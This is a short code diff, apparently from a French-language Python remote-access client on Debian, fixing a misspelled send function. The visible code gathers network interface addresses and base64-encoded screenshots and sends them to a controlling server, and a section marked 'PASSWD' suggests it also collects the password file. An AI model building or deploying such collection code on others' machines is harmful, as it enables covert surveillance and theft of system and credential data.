@@ -103,7 +103,7 @@ def main():
                         for addr in addrs:
                             if addr.family == socket.AF_INET:
                                 infos.append(f"{nom_if} : {addr.address}")
-                    envoyeur(client, "result", {"ok": True, "payload": {"interfaces": "\n".join(infos)}}, identifiant)
+                    envoyer(client, "result", {"ok": True, "payload": {"interfaces": "\n".join(infos)}}, identifiant)
                     print("[DEBIAN] INTERFACES envoyées")
 
                 # 4. PASSWD
@@ -147,7 +147,7 @@ def main():
                         buffer = io.BytesIO()
                         img.save(buffer, format="PNG")
                         b64_img = base64.b64encode(buffer.getvalue()).decode('utf-8')
-                        envoyeur(client, "result", {"ok": True, "payload": {"screenshot": b64_img}}, identifiant)
+                        envoyer(client, "result", {"ok": True, "payload": {"screenshot": b64_img}}, identifiant)
                         print("[DEBIAN] SCREENSHOT envoyé")
                     except Exception as e:
                         envoyer(client, "error", {"code": "ERR_SCREEN", "message": str(e)}, identifiant)
